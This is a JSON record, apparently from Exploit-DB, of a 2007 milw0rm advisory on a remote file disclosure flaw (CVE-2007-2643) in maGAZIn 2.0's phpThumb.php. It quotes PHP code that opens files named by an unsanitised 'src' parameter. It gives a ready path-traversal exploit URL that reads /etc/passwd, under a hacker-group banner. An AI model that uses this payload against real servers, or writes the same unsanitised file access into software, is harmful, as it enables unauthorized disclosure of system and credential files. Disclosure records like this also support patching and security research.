{
  "id": "3901",
  "title": "maGAZIn 2.0 - &#039;PHPThumb.php?src&#039; Remote File Disclosure",
  "cve": "CVE-2007-2643",
  "vuln_type": "unknown",
  "code": "        \\\\\\|///\r\n      \\\\  - -  //\r\n       (  @ @ )\r\n----oOOo--(_)-oOOo---------------------------------------------------\r\n\r\n[ Y! Underground Group ]\r\n[   Dj7xpl@yahoo.com   ]\r\n[    Dj7xpl.2600.ir    ]\r\n\r\n----ooooO-----Ooooo--------------------------------------------------\r\n    (   )     (   )\r\n     \\ (       ) /\r\n      \\_)     (_/\r\n\r\n---------------------------------------------------------------------\r\n\r\n[!] Portal   :   maGAZIn v2.0\r\n[!] Download :   http://www.pinkcrow.net/Scripts/gallery.php\r\n[!] Type     :   Remote File Disclosure Vulnerability\r\n\r\n---------------------------------------------------------------------\r\n\r\n---------------------------------------------------------------------\r\n\r\nVuln Code :  Line (152 - 157)\r\n\r\n[Code]\r\nif ($fp = @fopen($_SERVER['DOCUMENT_ROOT'].$_REQUEST['src'], 'rb')) {\r\n\t\t$OriginalImageData = fread($fp, filesize($_SERVER['DOCUMENT_ROOT'].$_REQUEST['src']));\r\n\t\tfclose($fp);\r\n\t} else {\r\n\t\tErrorImage('cannot open '.$_SERVER['DOCUMENT_ROOT'].$_REQUEST['src'], 400, 50);\r\n\t}\r\n[/Code]\r\n\r\n---------------------------------------------------------------------\r\n\r\n---------------------------------------------------------------------\r\n\r\nBug :\r\n\r\nhttp://[Target]/[Path]/phpThumb.php?src=[Local File]\r\n\r\nExample :\r\n\r\nhttp://Target.ir/Gallery/phpThumb.php?src=../../../etc/passwd\r\n\r\n---------------------------------------------------------------------\r\n\r\n# milw0rm.com [2007-05-11]",
  "url": "https://www.exploit-db.com/exploits/3901"
}